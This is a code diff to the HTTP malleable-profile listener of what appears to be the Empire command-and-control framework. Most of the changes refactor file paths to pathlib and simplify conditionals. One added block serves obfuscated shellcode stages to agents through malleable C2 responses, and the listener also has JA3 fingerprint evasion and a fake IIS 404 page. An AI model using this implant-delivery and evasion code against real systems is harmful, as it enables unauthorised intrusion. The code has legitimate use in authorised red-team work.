@@ -7,6 +7,7 @@ import ssl
 import sys
 import time
 import urllib.parse
+from pathlib import Path
 
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import ed25519
@@ -151,7 +152,7 @@ class Listener:
             data_util.get_config("staging_key")[0]
         )
 
-        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
+        self.template_dir = self.mainMenu.install_path / "data/listeners/templates"
 
         self.instance_log = log
 
@@ -174,8 +175,7 @@ class Listener:
         """
         Returns an IIS 7.5 404 not found page.
         """
-        with open(f"{self.template_dir}/default.html") as f:
-            return f.read()
+        return (self.template_dir / "default.html").read_text(encoding="utf-8")
 
     def validate_options(self) -> tuple[bool, str | None]:
         """
@@ -621,8 +621,7 @@ class Listener:
 
         if language.lower() == "powershell":
             template_path = [
-                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                self.mainMenu.install_path / "data/agent/stagers",
             ]
 
             eng = templating.TemplateEngine(template_path)
@@ -701,8 +700,7 @@ class Listener:
             )
 
             template_path = [
-                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                self.mainMenu.install_path / "data/agent/stagers",
             ]
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template("http_malleable/http_malleable.py")
@@ -772,8 +770,9 @@ class Listener:
 
         if language == "powershell":
             # read in agent code
-            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
-                code = f.read()
+            code = (self.mainMenu.install_path / "data/agent/agent.ps1").read_text(
+                encoding="utf-8"
+            )
 
             # strip out the comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -801,12 +800,12 @@ class Listener:
 
         if language == "python":
             # read in the agent base
-            if version == "ironpython":
-                f = self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
-            else:
-                f = self.mainMenu.installPath + "/data/agent/agent.py"
-            with open(f) as f:
-                code = f.read()
+            agent_path = (
+                self.mainMenu.install_path / "data/agent/ironpython_agent.py"
+                if version == "ironpython"
+                else self.mainMenu.install_path / "data/agent/agent.py"
+            )
+            code = agent_path.read_text(encoding="utf-8")
 
             # strip out comments and blank lines
             code = helpers.strip_python_comments(code)
@@ -885,16 +884,7 @@ try {{
             # ==== CHOOSE URI ====
             getTask += (
                 "$taskURI = "
-                + ",".join(
-                    [
-                        f"'{u}'"
-                        for u in (
-                            profile.get.client.uris
-                            if profile.get.client.uris
-                            else ["/"]
-                        )
-                    ]
-                )
+                + ",".join([f"'{u}'" for u in (profile.get.client.uris or ["/"])])
                 + " | Get-Random;"
             )
 
@@ -1006,16 +996,7 @@ $vWc.Proxy = $Script:Proxy;
             # ==== CHOOSE URI ====
             sendMessage += (
                 "$taskURI = "
-                + ",".join(
-                    [
-                        f"'{u}'"
-                        for u in (
-                            profile.post.client.uris
-                            if profile.post.client.uris
-                            else ["/"]
-                        )
-                    ]
-                )
+                + ",".join([f"'{u}'" for u in (profile.post.client.uris or ["/"])])
                 + " | Get-Random;"
             )
 
@@ -1396,20 +1377,16 @@ class ExtendedPacketHandler(PacketHandler):
                 # identify the implementation by uri
                 implementation = None
                 for uri in sorted(
-                    (
-                        profile.stager.client.uris
-                        if profile.stager.client.uris
-                        else ["/"]
-                    )
-                    + (profile.get.client.uris if profile.get.client.uris else ["/"])
-                    + (profile.post.client.uris if profile.post.client.uris else ["/"]),
+                    (profile.stager.client.uris or ["/"])
+                    + (profile.get.client.uris or ["/"])
+                    + (profile.post.client.uris or ["/"]),
                     key=len,
                     reverse=True,
                 ):
                     if request_uri.startswith(uri.lstrip("/")):
                         # match!
                         for imp in [profile.stager, profile.get, profile.post]:
-                            if uri in (imp.client.uris if imp.client.uris else ["/"]):
+                            if uri in (imp.client.uris or ["/"]):
                                 implementation = imp
                                 break
                         if implementation:
@@ -1430,9 +1407,7 @@ class ExtendedPacketHandler(PacketHandler):
                 elif implementation is profile.post:
                     # the post implementation has two spots for data, requires two-part extraction
                     agentInfo, output = implementation.extract_client(malleableRequest)
-                    agentInfo = (agentInfo if agentInfo else b"") + (
-                        output if output else b""
-                    )
+                    agentInfo = (agentInfo or b"") + (output or b"")
                     self.instance_log.debug(
                         f"{listenerName}: extracted agentInfo from post (two-part), len={len(agentInfo)}"
                     )
@@ -1460,7 +1435,7 @@ class ExtendedPacketHandler(PacketHandler):
                         self.instance_log.error(message)
                         log.error(message)
 
-                    for language, results in dataResults:
+                    for language, results, additional in dataResults:
                         if results:
                             if isinstance(results, str):
                                 results = results.encode("latin-1")
@@ -1477,6 +1452,38 @@ class ExtendedPacketHandler(PacketHandler):
                                     obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                                         db, language
                                     )
+
+                                    if additional.lower() == "shellcode":
+                                        stage, err = (
+                                            self.mainMenu.stagergenv2.generate_shellcode(
+                                                language=language.lower(),
+                                                listener_name=listenerName,
+                                                obfuscate=obf_config.enabled
+                                                if obf_config
+                                                else False,
+                                                obfuscation_command=obf_config.command
+                                                if obf_config
+                                                else "",
+                                                arch="both",
+                                                dot_net_version="net40",
+                                            )
+                                        )
+                                        if err:
+                                            log.error(
+                                                f"Error generating shellcode: {err}"
+                                            )
+                                            return Response(
+                                                self.default_response(), 404
+                                            )
+                                        malleableResponse = (
+                                            implementation.construct_server(stage)
+                                        )
+                                        return Response(
+                                            malleableResponse.body,
+                                            malleableResponse.code,
+                                            malleableResponse.headers,
+                                        )
+
                                     stager = self.generate_stager(
                                         language=language,
                                         listenerOptions=listenerOptions,
@@ -1563,9 +1570,7 @@ class ExtendedPacketHandler(PacketHandler):
                                     agentCode = self.generate_agent(
                                         language=language,
                                         listenerOptions=(
-                                            tempListenerOptions
-                                            if tempListenerOptions
-                                            else listenerOptions
+                                            tempListenerOptions or listenerOptions
                                         ),
                                         obfuscate=(
                                             False
@@ -1719,8 +1724,7 @@ class ExtendedPacketHandler(PacketHandler):
                     directory = self.mainMenu.stagergenv2.generate_python_exe(
                         launcher, dot_net_version="net40", obfuscate=obfuscation
                     )
-                    with open(directory, "rb") as f:
-                        return f.read()
+                    return Path(directory).read_bytes()
 
                 # log invalid request
                 message = (
@@ -1740,10 +1744,10 @@ class ExtendedPacketHandler(PacketHandler):
             ja3_evasion = listenerOptions["JA3_Evasion"]["Value"]
 
             if host.startswith("https"):
-                if certPath.strip() == "" or not os.path.isdir(certPath):
+                if certPath.strip() == "" or not Path(certPath).is_dir():
                     log.info(f"Unable to find certpath {certPath}, using default.")
                     certPath = "setup"
-                certPath = os.path.abspath(certPath)
+                cert_path = Path(certPath).resolve()
                 pyversion = sys.version_info
 
                 # support any version of tls
@@ -1756,8 +1760,8 @@ class ExtendedPacketHandler(PacketHandler):
 
                 context = ssl.SSLContext(proto)
                 context.load_cert_chain(
-                    f"{certPath}/empire-chain.pem",
-                    f"{certPath}/empire-priv.key",
+                    cert_path / "empire-chain.pem",
+                    cert_path / "empire-priv.key",
                 )
 
                 if ja3_evasion:
@@ -1783,7 +1787,7 @@ class ExtendedPacketHandler(PacketHandler):
         self.thread = helpers.KThread(target=self.start_server, args=(listenerOptions,))
         self.thread.daemon = True
         self.thread.start()
-        time.sleep(1)
+        time.sleep(0.1 if os.environ.get("TEST_MODE") else 1)
         # returns True if the listener successfully started, false otherwise
         return self.thread.is_alive()
 
